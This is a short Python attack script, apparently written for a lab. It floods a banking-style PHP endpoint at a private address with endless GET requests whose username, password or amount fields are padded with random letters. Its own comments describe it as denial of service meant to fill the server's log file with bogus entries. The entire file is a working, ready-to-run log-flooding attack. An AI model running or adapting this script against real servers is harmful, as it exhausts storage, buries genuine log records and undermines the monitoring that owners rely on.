#!/usr/bin/python

#Random curl request, the only thing changing is the length of it. Can be considered denial of service I believe
#Its aim is to fill the log file with bogus information
import requests
import random
import string
from time import sleep
import sys

username = ""
password = ""

beg_req = "http://10.1.5.2/process.php"

#Create a dummy request, which length correspond to our first argument, and then send it
def fill_log(length):
    global username
    
    types = ["deposit", "withdraw"]
    amount = "1"
    drop = random.choice(types)
    temp_username = username
    temp_password = password
    temp_amount = amount
    #Depending on choice, either username, password or amount will be lengthened
    choice = random.randint(1,3)
    append_rand = ''.join(random.choice(string.ascii_lowercase) for i in range(int(length)))
    if choice == 1:
        temp_username = username + append_rand
    if choice == 2:
        temp_password = password + append_rand
    if choice == 3 :
        temp_amount = amount + append_rand

    #Craft the second part of our request  
    params = (
        ('user', temp_username),
        ('pass', temp_password),
        ('drop', drop),
        ('amount', temp_amount),
    )
    #Send it to the server
    response = requests.get(beg_req, params=params)
    #print(response.text)


def main():
    if len(sys.argv) != 3:
        print("Usage: python curl_request_set_length.py lengthOfRequest sleepTime")
        exit(-1)
    print(sys.argv[1])
    global username
    global password
    append_rand = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    username += append_rand
    password += append_rand
    #Spam transaction to fill log file, sleep time is adjustable
    while (1):
        fill_log(sys.argv[1])
        sleep(int(sys.argv[2]))
        
main()
